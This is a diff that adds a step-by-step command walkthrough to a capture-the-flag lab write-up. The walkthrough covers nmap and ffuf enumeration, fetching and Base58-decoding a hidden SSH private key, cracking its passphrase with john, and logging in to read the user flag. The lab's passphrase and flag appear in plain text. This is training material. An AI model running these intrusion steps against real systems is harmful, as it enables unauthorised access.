@@ -102,13 +102,115 @@ chmod 600 + ssh -i id_rsa icex64@<target ip>   →  shell as icex64
 
 ---
 
+## 🧪 Full Command Walkthrough
+
+Every command used in the engagement, with inline comments. Replace `<target ip>`
+with the machine's actual address on your lab network.
+
+### 1 · Reconnaissance
+
+```bash
+# Discover live hosts on the local (host-only) segment via ARP.
+# Reveals the target's IP without touching it noisily.
+sudo netdiscover
+
+# Quick default TCP scan — which ports are open?
+# Result here: 22/tcp (ssh) and 80/tcp (http).
+nmap <target ip>
+
+# Deep scan of the two known ports:
+#   -sS  SYN (stealth) scan
+#   -sV  service/version detection (OpenSSH 8.4p1, Apache 2.4.48)
+#   -sC  default NSE scripts (pulls http-robots.txt -> /~myfiles)
+nmap -sV -sS -sC <target ip>
+```
+
+### 2 · Web Enumeration
+
+```bash
+# Read the robots.txt hinted at by nmap.
+# It disallows /~myfiles ... which turns out to be a 404 decoy.
+curl http://<target ip>/robots.txt
+
+# The '~' prefix screams Apache userdir. Fuzz for real userdir names.
+#   -w   wordlist
+#   -c   colourised output
+#   -ic  ignore wordlist comment lines
+#   -fc 403   filter out 403 responses (noise)
+# -> finds "secret" (HTTP 301), i.e. /~secret/
+ffuf -u http://<target ip>/~FUZZ \
+     -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt \
+     -c -ic -fc 403
+
+# View the /~secret/ page — it contains a note from "icex64" saying an
+# SSH private key is HIDDEN in this directory and the passphrase is
+# crackable with "fasttrack". Two big hints in one message.
+curl http://<target ip>/~secret/
+
+# Fuzz again, this time for HIDDEN files (leading dot) inside /~secret/:
+#   -e .txt,.html   also try these extensions on each word
+# -> finds .mysecret.txt (HTTP 200, size 4689)
+ffuf -u http://<target ip>/~secret/.FUZZ \
+     -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt \
+     -c -ic -fc 403 \
+     -e .txt,.html
+```
+
+### 3 · Credential Access (recover & crack the SSH key)
+
+```bash
+# Grab the hidden file. It's ONE long high-entropy line — an encoded blob,
+# not a raw key. Character set (no 0/O/I/l) => Base58.
+curl http://<target ip>/~secret/.mysecret.txt
+
+# Base58-decode the blob to recover the OpenSSH private key.
+# (Done via an online Base58 decoder, or the CLI below.)
+# Save the decoded output as id_rsa.
+curl -s http://<target ip>/~secret/.mysecret.txt | base58 -d > id_rsa
+#   ^ if the 'base58' tool isn't installed:  pip install base58   (or use an online decoder)
+
+# The key is passphrase-protected. Convert it to a John-crackable hash.
+ssh2john id_rsa > hash.txt
+
+# Crack the passphrase using the author-hinted 'fasttrack' wordlist.
+# (First run without sudo may hit "Permission denied" on the wordlist path —
+#  re-run with sudo as shown.)
+sudo john --wordlist=/usr/share/wordlists/fasttrack.txt hash.txt
+#   -> recovered passphrase:  P@55w0rd!
+
+# (Optional) redisplay the cracked passphrase later:
+john --show hash.txt
+```
+
+### 4 · Initial Access (SSH foothold)
+
+```bash
+# SSH rejects world-readable private keys with "bad permissions".
+# Lock the key down to owner-read/write only.
+chmod 600 id_rsa
+
+# Log in with the recovered key as icex64 (username came from the note).
+# When prompted for the key passphrase, enter:  P@55w0rd!
+ssh -i id_rsa icex64@<target ip>
+```
+
+### 5 · User Flag
+
+```bash
+# Now on the box as icex64 — read the user flag from the home directory.
+cat user.txt
+#   -> 3mp!r3{I_See_That_You_Manage_To_Get_My_Bunny}
+```
+
+---
+
 ## 🛠️ Tools Used
 
 `netdiscover` · `nmap` · `ffuf` · `ssh2john` · `john` · Base58 decoder · `ssh`
 
 ---
 
-##  Findings Summary
+## 🚩 Findings Summary
 
 | # | Finding | Severity |
 |---|---|---|
